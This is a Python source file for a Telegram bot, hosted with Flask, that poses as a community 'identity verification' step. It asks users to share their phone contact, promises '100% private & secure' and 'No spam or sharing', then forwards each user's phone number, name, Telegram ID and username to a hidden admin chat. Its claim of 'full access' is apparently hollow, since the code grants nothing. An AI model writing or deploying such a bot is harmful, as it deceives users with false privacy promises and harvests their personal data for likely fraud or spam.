import os
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import datetime
import logging
from flask import Flask, request

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app for Render deployment
app = Flask(__name__)

# Get configuration from environment variables (set in Render dashboard)
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # Set this in Render environment variables

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def home():
    return "Telegram Verification Bot is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'Bad request', 400

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """1-click verification with trust elements"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("🔒 VERIFY SECURELY", request_contact=True))
    
    bot.send_message(
        message.chat.id,
        "🔐 *Identity Verification Required*\n\n"
        "To ensure a safe community, we verify all members through their phone number.\n\n"
        "✓ One-time verification\n"
        "✓ 100% private & secure\n"
        "✓ No spam or sharing\n\n"
        "Tap *VERIFY SECURELY* below to continue:",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Process contact and notify admin"""
    contact = message.contact
    user = message.from_user
    
    verification_info = (
        f"🆕 *New Verification*\n\n"
        f"👤 *User*: {user.first_name} {user.last_name or ''}\n"
        f"📱 *Phone*: +{contact.phone_number}\n"
        f"🆔 *Telegram ID*: {user.id}\n"
        f"🌐 *Username*: @{user.username or 'none'}\n"
        f"⏰ *Time*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    bot.send_message(
        message.chat.id,
        f"✅ *Verification Complete*\n\n"
        f"Thank you {user.first_name}!\n"
        f"We've securely verified +{contact.phone_number}\n\n"
        f"You now have full access.",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    
    if ADMIN_CHAT_ID:
        try:
            bot.send_message(ADMIN_CHAT_ID, verification_info, parse_mode='Markdown')
            logger.info("Sent alert to admin")
        except Exception as e:
            logger.error(f"Failed to notify admin: {e}")

def set_webhook():
    """Set webhook on Render deployment"""
    if WEBHOOK_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
        logger.info(f"Webhook set to: {WEBHOOK_URL}")

if __name__ == '__main__':
    logger.info("Starting bot...")
    
    # Verify credentials
    if not BOT_TOKEN:
        logger.error("MISSING BOT TOKEN! Set TELEGRAM_BOT_TOKEN environment variable")
        exit(1)
        
    if not ADMIN_CHAT_ID:
        logger.warning("Admin notifications disabled (ADMIN_CHAT_ID not set)")
    
    # For Render deployment
    if os.getenv('RENDER'):  # This environment variable exists on Render
        set_webhook()
        app.run(host='0.0.0.0', port=10000)
    else:  # Local development
        bot.remove_webhook()
        bot.polling()
